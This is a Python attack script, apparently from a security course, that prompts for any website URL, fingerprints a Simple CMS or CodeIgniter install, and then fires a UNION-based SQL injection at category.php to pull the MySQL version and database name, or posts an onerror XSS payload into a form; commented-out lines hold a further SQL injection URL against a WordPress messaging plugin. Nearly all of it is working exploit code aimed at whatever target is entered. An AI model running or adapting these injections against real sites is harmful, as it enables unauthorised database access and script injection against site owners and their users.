import mechanize
import requests
from bs4 import BeautifulSoup
from bs4 import Comment

browser = mechanize.Browser()
browser.set_handle_robots(False)

#ask the user the url to exploit
#url = "http://localhost/InformationSecurity/CMSsite-master/"
url = input("Enter the url of the website you want to exploit: ")

try:
    browser.open(url)

    print("\n" + "Title: " + browser.title() + "\n")

    page = browser.response().read()
    soupParser = BeautifulSoup(page, "html.parser")

    #define the target
    target=0



    #Is it Victor Alagwu's Simple CMS?
    comments = soupParser.findAll(string=lambda text: isinstance(text, Comment))
    #printing the message with the id I chose
    for comment in comments:
        if "Victor Alagwu" in comment and "Simple Content Management System" in comment:
            print("This is Simple Content Management System by Victor Alagwu")
            target = 1
            break

    #Is it codeIgniter?
    if "codeigniter" in url:
        target = 2


    #show possible hacks for the target
    if target==1:



        #make sure there is a slash at the end of the url
        if url[-1] != '/':
            url = url + '/'

        #get MySQL version and database name of the website
        browser.open(url + "category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10;+--")
        page = browser.response().read()
        soupParser = BeautifulSoup(page, "html.parser")

        titles = soupParser.findAll("a", {"href": "post.php?post=1"})
        print("MySQL version: " + titles[0].text)

        authors = soupParser.findAll("h3")
        print("Database name: " + authors[0].a.text)

    if target==2:
        r = requests.get(url) #"http://localhost/codeigniter/index.php/xssdemo"
        soup = BeautifulSoup(r.content, "html.parser")

        print('Form where the malicious code has to be injected:')
        print()

        form = soup.find('form')
        print (form)
        print()

        payload =  '<img/src=">" onerror=alert(1)>'

        print("Payload:")
        print()
        print(payload)
        print()

        postdata = {
                "xss" : payload
               }

        r = requests.post(url, data=postdata)

        soup = BeautifulSoup(r.content, "html.parser")

        print('Injected code:')
        print()
        print (soup.find('img'))


    elif target==0:
        print("I cannot define the target")

except:
    print("Error! It could be the url")

#text = div.text
#text = "".join([s for s in text.splitlines(True) if s.strip("\r\n")])
#almost_clean_text = text.replace('&lt','')
#clean_text = almost_clean_text.replace('&gt','')
#print(clean_text.lstrip() + '\n')


#opening a page injecting the malicious sql code with a specific ID to see a specific messagge
#response = browser.open("http://localhost:8888/wordpress/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=5%20UNION%20SELECT%20*%20FROM%20wp_spm_message")


#browser.select_form("loginform")

#browser.form['log'] = 'test'
#browser.form['pwd'] = 'test'
#browser.submit()

#printing the title of the page to show my steps
#print ("\n" + "# " + browser.title() + "\n")
